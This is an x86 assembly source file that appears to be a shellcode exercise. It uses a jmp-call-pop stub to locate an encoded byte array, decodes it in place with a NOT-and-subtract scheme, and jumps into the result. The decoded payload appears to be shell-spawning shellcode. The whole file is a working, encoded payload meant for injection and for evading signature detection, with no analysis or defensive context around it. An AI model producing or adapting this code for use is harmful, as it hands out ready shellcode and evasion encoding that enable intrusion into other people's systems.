global _start

section .text

_start:
	; Ye ol' jmpy cally popy
	jmp short call_shellcode

decode:

	; pop the location of encodedShellcode into EDI
	pop edi
	xor ecx, ecx
	mov cl, len

decoder:
	; get the byte in edi into eax
	mov al, byte [edi]

	; check the size of the byte
	cmp al, 0x0A

	; If it's less than our shift, jump to rollover
	jl short rollover

	; not the byte
	; sub 10 from it, then replace it
	not byte al
	sub al, 0x0C
	;not byte al
	mov [edi], al
	
	jmp short next

rollover:
	; We're here because the number is going to rollover if we add to it

	; zero ebx, then add FF to it
	; add one, to get 100 without nulls
	xor ebx, ebx	
	mov bl, 0xff
	inc bx

	; just subtract from bl
	sub bl, 0x0C

	; not the byte
	; add the shift and replace it
	not byte al
	mov esi, eax
	add ebx, esi
	;add bl, al
	mov [edi], bl

next:
	inc edi
	loop decoder
	jmp short encodedShellcode



call_shellcode:

	call decode
	encodedShellcode: db 0xc2,0x33,0xa3,0x8b,0x91,0x92,0x80,0x8b,0x8b,0x91,0x8a,0x85,0xc4,0x8b,0xc4,0xc4,0xc4,0xc4,0x6a,0x10,0xa3,0x6a,0x11,0xa0,0x6a,0x12,0x43,0xe8,0x26,0x73
	len: equ $-encodedShellcode


